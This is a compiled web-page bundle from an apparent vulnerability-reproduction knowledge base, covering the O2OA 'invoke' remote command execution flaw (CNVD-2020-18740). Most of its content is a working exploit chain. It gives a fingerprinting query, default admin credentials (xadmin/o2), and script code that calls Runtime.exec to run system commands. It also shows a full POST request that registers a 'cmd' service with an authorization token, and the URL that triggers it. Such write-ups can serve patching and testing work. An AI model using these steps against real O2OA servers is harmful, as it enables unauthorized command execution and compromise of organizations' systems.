import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as t,e as i}from"./app-58e4a7d6.js";const n={},r=i(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>O2OA是一款开源免费的企业及团队办公平台，提供门户管理、流程管理、信息管理、数据管理四大平台,集工作汇报、项目协作、移动OA、文档分享、流程审批、数据协作等众多功能，满足企业各类管理和协作需求。 O2OA系统invoke 接口存在远程代码执行漏洞。攻击者可利用漏洞执行任意代码。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>O2OA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title==&quot;O2OA&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208291027154.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>默认密码登录后台 <code>xadmin/o2</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208291027581.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在应用中找到服务管理，创建接口代码执行系统命令</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;id&quot;).getInputStream()));

var result = [];
while (true) {
    var oneline = bufReader.readLine();
    result.push(oneline);
    if (!oneline) break;
}
var result = { &quot;Result&quot;: result };
this.response.setBody(result, &quot;application/json&quot;); 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208291028397.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>请求包</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /x_program_center/jaxrs/invoke?v=6.3 HTTP/1.1
Authorization: PfyuxmzgIzrrkjVKSmRBJ4uCkH5tYmpq50QnO7mEHhA

{&quot;id&quot;:&quot;cmd&quot;,&quot;name&quot;:&quot;cmd&quot;,&quot;enableToken&quot;:false,&quot;alias&quot;:&quot;&quot;,&quot;description&quot;:&quot;&quot;,&quot;validated&quot;:true,&quot;enable&quot;:true,&quot;text&quot;:&quot;var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\\&quot;id\\&quot;).getInputStream()));\\n\\nvar result = [];\\nwhile (true) {\\n    var oneline = bufReader.readLine();\\n    result.push(oneline);\\n    if (!oneline) break;\\n}\\nvar result = { \\&quot;Result\\&quot;: result };\\nthis.response.setBody(result, \\&quot;application/json\\&quot;); &quot;,&quot;remoteAddrRegex&quot;:&quot;&quot;,&quot;createTime&quot;:&quot;2022-08-27 04:39:18&quot;,&quot;updateTime&quot;:&quot;2022-08-27 04:39:18&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208291028838.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>创建成功后访问接口执行系统命令</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/x_program_center/jaxrs/invoke/cmd/execute
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208291028615.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,20),d=[r];function u(o,s){return a(),t("div",null,d)}const v=e(n,[["render",u],["__file","O2OA invoke 后台远程命令执行漏洞 CNVD-2020-18740.html.vue"]]);export{v as default};
